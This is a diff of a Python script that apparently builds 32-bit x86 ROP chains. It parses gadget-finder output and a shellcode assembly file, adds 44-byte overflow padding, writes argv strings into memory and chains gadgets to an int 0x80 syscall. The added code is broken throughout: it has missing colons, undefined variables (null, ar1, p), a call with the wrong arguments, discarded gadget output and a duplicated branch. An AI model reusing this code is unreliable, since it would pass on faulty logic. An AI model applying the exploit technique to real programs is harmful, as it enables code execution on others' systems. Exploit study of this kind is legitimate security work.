@@ -3,6 +3,7 @@
 import re
 import argparse
 from pathlib import Path
+from struct import pack
 
 
 parser = argparse.ArgumentParser(
@@ -15,36 +16,75 @@ parser.add_argument("--shellcode", default= None)
 parser.add_argument("--out-rop-path", default = None)
 
 def main(args):
-    # argv = args.command.split()
-    #envp = args.envp.split()s
-    # push_array_of_strings(argv)
-    contents = reads(args.shellcode)
-    print(contents)
-    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
 
-def reads(file_name):
+    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
+    gadgets = removeNone(gadgets)
+    rop_chain = b'A'*44
+    data_values = []
+    contents,data_values = reads(args.shellcode, data_address,data_values)
+    rop_chain, stack_ptr, argv_ptr, chunks = chunking(data_values,gadgets, data_address, rop_chain, null)
+    rop_chain += pack('<I', argv_ptr)  # Put argv in ecx
+    rop_chain, register_info = readinstructions(args.shellcode,data_address,data_values,contents,rop_chain,gadgets, null)
+
+def reads(file_name,data_address,data_values):
     rodata_start = False
-    rodata_contents = []
+    # rodata_contents = []
+    # rodata_start = False
+    label_address_map = {}
+    current_address = data_address
+      
     try:
         with open(file_name, 'r') as file:
             for line in file:
-                line = line.strip()
+                line = line.strip()  
+
                 if '.rodata' in line:
                     rodata_start = True
                     continue
+                if rodata_start:
+                    # Check for a label
+                    if ':' in line:
+                        label, data = line.split(':', 1)
+                        label = label.strip()
+                        data = data.strip()
+                        label_address_map[label] = current_address  # Map label to current address
+                        # size = {'db': 1, 'dw': 2, 'dd': 4, 'dq': 8, 'dt': 10}.get(directive, 0)
+                        # Process db directive
+                        if 'db' in data:
+                            # Calculate the size of the data
+                            parts = data.split('"')
+                            string_value = parts[1]
+                            data_values.append(string_value)  # Add the string value to the list
+                            string_size = len(string_value) + 1  # Add 1 for the null terminator
+                            current_address += string_size  # Update the current address
 
-                if rodata_start: 
-                    if any(data_directive in line for data_directive in ['db', 'dw', 'dd', 'dq', 'dt']):
-                        parts = line.split(maxsplit=1)
-                        if len(parts) > 1: 
-                            rodata_contents.append(parts[1])
+                        elif 'dw' in data:
+                            current_address += 2  # dw is typically 2 bytes for an address
+
+                        elif 'dd' in data:
+                             # Split the data items and allocate 4 bytes for each
+                            items = data.replace('dq', '').split(',')
+                            for item in items:
+                                current_address += 4  
+
+                        elif 'dq' in data:
+                            # items = data.replace('dq', '').split(',')
+                            # if len(items) > 1:
+                            #     for item in items:
+                            #          current_address += 4 
+                            # else:
+                                current_address += 8  
+
+                        # Process dq directive
+                        elif 'dd' in data:
+                            current_address += 10  
 
     except FileNotFoundError:
         print(f"The file {file_name} was not found.")
     except Exception as e:
          print(f"An error occurred: {e}")
 
-    return rodata_contents
+    return label_address_map,data_values
 
 
 def parse_out_rop(path: Path):
@@ -53,8 +93,23 @@ def parse_out_rop(path: Path):
         ": pop edx ; ret": None,
         ": pop eax ; ret": None,
         ": xor eax, eax ; ret": None,
+        ": xor ecx, ecx ; ret": None,
+        ": xor edx, edx ; ret": None,
+        ": xor ebx, ebx ; ret": None,
+        ": and edx, 0 ; ret": None, 
+        ": sub edx, edx ; ret": None, 
+        ": and eax, 0 ; ret": None,
+        ": sub eax, edx ; ret": None,
+        ": and ebx, 0 ; ret": None,
+        ": sub ebx, edx ; ret": None, 
+        ": and ecx, 0 ; ret": None,
+        ": sub ecx, edx ; ret": None, 
         ": inc eax ; ret": None,
+        ": inc ebx ; ret": None,
+        ": inc ecx ; ret": None,
+        ": inc edx ; ret": None,
         ": pop ebx ; ret": None,
+        ": pop ecx ; ret": None,
         ": pop ecx ; pop ebx ; ret": None,
         ": int 0x80": None,
     }
@@ -68,23 +123,288 @@ def parse_out_rop(path: Path):
                 match = data_addrPat.search(line)
                 if match:
                     extracted_part = match.group(1)
-                    data_address = extracted_part
-                    print(data_address)
-
+                    data_address = int(extracted_part,16)
             elif any(gadget in line for gadget in rop_gadgets.keys()):
                 tokens = line.split()
                 gadget_key = ' '.join(tokens[1:])
-                rop_gadgets[gadget_key] = tokens[0]
+                rop_gadgets[gadget_key] = int(tokens[0],16)
 
     return rop_gadgets, data_address
 
-# def push_array_of_strings(array, rop_gadgets):
-#     for string in array:
-#         chunks = [string[i:i+4] for i in range(0, len(string), 4)]
-#         chunks = [chunk.ljust(4, '\0') for chunk in chunks]
+def chunking(array, gadgets, data_address, rop_chain):
+    stack_pointer = data_address
+    pointers = []
+    chunks = []
+    new_chunks = []
+    for string in array:
+        pointers.append(stack_pointer)
+        chunks = [string[i:i+4] for i in range(0, len(string), 4)]
+        # If the chunk isn't big enough, pad it with null characters.
+        chunks = [chunk.ljust(4, '\0') for chunk in chunks]
+        new_chunks.append(chunks)
 
-#         for chunk in chunks:
-#             print(chunk)
+        for chunk in chunks:
+
+            push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
+            stack_pointer += 4
+
+        null = stack_pointer
+        rop_chain += push_null(gadgets, stack_pointer)
+        stack_pointer += 4
+
+    array_pointer = stack_pointer
+    
+    for pointer in pointers:
+        push_item(gadgets, stack_pointer, pointer)
+        stack_pointer += 4
+    
+    rop_chain += push_null(gadgets, stack_pointer)
+    stack_pointer += 4
+
+    return rop_chain, stack_pointer, array_pointer, new_chunks, null
+
+def push_string(gadgets, stack_pointer, string):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+    rop_chain += string
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
+
+
+def push_item(gadgets, stack_pointer, item):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+    rop_chain += pack('<I', item)
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
+
+
+def push_null(gadgets, stack_pointer):
+    rop_chain = b''
+    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+    rop_chain += pack('<I', stack_pointer)
+    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
+    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
+    return rop_chain
+
+def readinstructions(file_name, data_address, data_values, contents,rop_chain,gadgets,null):
+    register_info = dict({'ebx': None,
+                           'eax': None,
+                           'ecx': None,
+                           'edx': None,})
+    try:
+        with open(file_name, 'r') as file:
+            for line in file:
+                line = line.strip()
+                if 'mov' in line:
+                    # Split the line by spaces
+                    parts = line.split()
+                    if len(parts) > 1:
+                        # Split the second part by comma and remove any trailing commas
+                        arg1 = parts[1].rstrip(',')
+                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
+                        # Call the mov function with the extracted arguments
+                        if arg1 and arg2:
+                            rop_chain, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
+                elif 'xor' in line:
+                    # Split the line by spaces
+                    parts = line.split()
+                    if len(parts) > 1:
+                        # Split the second part by comma and remove any trailing commas
+                        arg1 = parts[1].rstrip(',')
+                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
+                        # Call the mov function with the extracted arguments
+                        # if arg1 and arg2:
+                            # xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
+                elif 'int' in line:
+                    parts = line.split()
+                    rop_chain = intline(parts[0],parts[1], data_values,contents,rop_chain,gadgets,register_info)
+
+    except FileNotFoundError:
+        print(f"The file {file_name} was not found.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    return rop_chain, register_info
+    
+def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
+    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
+        if ar2 in contents:
+            # value = hex(contents.get(ar2))
+            if(ar1 == 'ecx'):
+                if ": pop ecx ; ret" in gadgets: 
+                    rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
+                    rop_chain += pack('<I', contents.get(ar2)) 
+                    register_info[ar1] = ar2
+                if ": pop ecx ; pop ebx ; ret" in gadgets:
+                    rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
+                    rop_chain += pack('<I', contents.get(ar2))
+                    rop_chain += pack('<I', contents.get(register_info.get('ebx')))
+                    register_info[ar1] = ar2
+            elif(ar1 == 'ebx'):   
+                if ": pop ebx ; ret" in gadgets: 
+                    rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
+                    rop_chain += pack('<I', contents.get(ar2))
+                    register_info[ar1] = ar2
+            elif(ar1 == 'eax'):    
+                if ": pop eax ; ret" in gadgets:
+                    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+                    rop_chain += pack('<I', contents.get(ar2))
+                    register_info[ar1] = ar2
+            elif(ar1 == 'edx'):    
+                if ': pop edx ; ret' in gadgets:
+                    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+                    rop_chain += pack('<I', contents.get(ar2))
+                    register_info[ar1] = ar2
+
+        elif (is_string_an_int(ar2)):
+            # rop_chain = xor(ar1,ar1,data_values,contents,rop_chain,gadgets,register_info)
+            for i in range(int(ar2)):  
+                if(ar1 == 'ecx'):
+                    if ': inc ecx ; ret' in gadgets:
+                        rop_chain += pack('<I', gadgets[": inc ecx ; ret"])
+                        register_info[ar1] = ar2
+
+                elif(ar1 == 'edx'):
+                    if ': inc edx ; ret' in gadgets:
+                        rop_chain += pack('<I', gadgets[": inc edx ; ret"])
+                        register_info[ar1] = ar2
+
+                elif(ar1 == 'eax'):
+                    if ': inc eax ; ret' in gadgets:
+                        rop_chain += pack('<I', gadgets[": inc eax ; ret"])
+                        register_info[ar1] = ar2   
+                
+                elif(ar1 == 'ebx'):
+                    if ': inc ebx ; ret' in gadgets:
+                        rop_chain += pack('<I', gadgets[": inc ebx ; ret"])
+                        register_info[ar1] = ar2
+                        
+
+    return rop_chain,register_info
+
+def xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null):
+    
+    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
+        if (ar1 == 'edx'):
+            condition1 = ': and edx, 0 ; ret' in gadgets
+            condition2 = ': mov edx, 0 ; ret' in gadgets
+            condition3 = ': sub edx, edx ; ret' in gadgets
+
+            if ar1 == ar2:
+                if ': xor edx, edx ; ret' in gadgets:
+                    rop_chain += pack('<I', gadgets[": xor edx, edx ; ret"])
+                elif condition1 or condition2 or condition3:
+                    if condition1:
+                         # Code to handle condition1
+                         rop_chain += pack('<I', gadgets[': and edx, 0 ; ret'])
+                    elif condition2:
+                        # Code to handle condition2
+                        rop_gadgets, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
+                    elif condition3:
+                        # Code to handle condition3
+                        rop_chain += pack('<I', gadgets[': sub edx, edx ; ret'])
+                else
+                        if ": pop edx ; ret" in gadgets: 
+                            rop_chain += pack('<I', gadgets[": pop edx ; ret"])
+                            p += pack('<I', null) 
+
+
+                
+        if (ar1 == 'ebx')
+            condition1 = ': and ebx, 0 ; ret' in gadgets
+            condition2 = ': mov ebx, 0 ; ret' in gadgets
+            condition3 = ': sub ebx, ebx ; ret' in gadgets
+
+            if ar1 == ar2:
+                if ': xor ebx, ebx ; ret' in gadgets:
+                    rop_chain += pack('<I', gadgets[": xor ebx, ebx ; ret"])
+                elif condition1 or condition2 or condition3:
+                    if condition1:
+                         # Code to handle condition1
+                         rop_chain += pack('<I', gadgets[': and ebx, 0 ; ret'])
+                    if condition2:
+                        # Code to handle condition2
+                        rop_gadgets, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
+                    if condition3:
+                        # Code to handle condition3
+                        rop_chain += pack('<I', gadgets[': sub ebx, ebx ; ret'])
+                else
+                        if ": pop ebx ; ret" in gadgets: 
+                            rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
+                            p += pack('<I', null)
+                    
+        if (ar1 == 'ecx')
+            condition1 = ': and ecx, 0 ; ret' in gadgets
+            condition2 = ': mov ecx, 0 ; ret' in gadgets
+            condition3 = ': sub ecx, ecx ; ret' in gadgets
+
+            if ar1 == ar2:
+                if ': xor ecx, ecx ; ret' in gadgets:
+                    rop_chain += pack('<I', gadgets[": xor ecx, ecx ; ret"])
+                elif condition1 or condition2 or condition3:
+                    if condition1:
+                         # Code to handle condition1
+                         rop_chain += pack('<I', gadgets[': and ecx, 0 ; ret'])
+                    if condition2:
+                        # Code to handle condition2
+                        rop_gadgets, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
+                    if condition3:
+                        # Code to handle condition3
+                        rop_chain += pack('<I', gadgets[': sub ecx, ecx ; ret'])
+                    else
+                        if ": pop ecx ; ret" in gadgets: 
+                            rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
+                            p += pack('<I', null)
+
+        if (ar1 == 'eax')
+            condition1 = ': and eax, 0 ; ret' in gadgets
+            condition2 = ': mov eax, 0 ; ret' in gadgets
+            condition3 = ': sub eax, eax ; ret' in gadgets
+
+            if ar1 == ar2:
+                if ': xor eax, eax ; ret' in gadgets:
+                    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
+                elif condition1 or condition2 or condition3:
+                    if condition1:
+                         # Code to handle condition1
+                         rop_chain += pack('<I', gadgets[': and eax, 0 ; ret'])
+                    if condition2:
+                        # Code to handle condition2
+                        rop_gadgets, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info)
+                    if condition3:
+                        # Code to handle condition3
+                        rop_chain += pack('<I', gadgets[': sub eax, eax ; ret'])
+                else
+                        if ": pop eax ; ret" in gadgets: 
+                            rop_chain += pack('<I', gadgets[": pop eax ; ret"])
+                            p += pack('<I', null)
+
+def intline(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):
+    if(ar2 == '0x80'):
+        rop_chain += pack('<I', gadgets[": int 0x80"])
+
+    return rop_chain    
+
+
+def is_string_an_int(s):
+    try:
+        int(s)
+        return True
+    except ValueError:
+        return False
+
+
+def removeNone(gadgets):
+    for key in list(gadgets.keys()):  
+        if gadgets[key] is None:
+            del gadgets[key]
+
+    return gadgets
 
 if __name__ == "__main__":
     main(parser.parse_args())
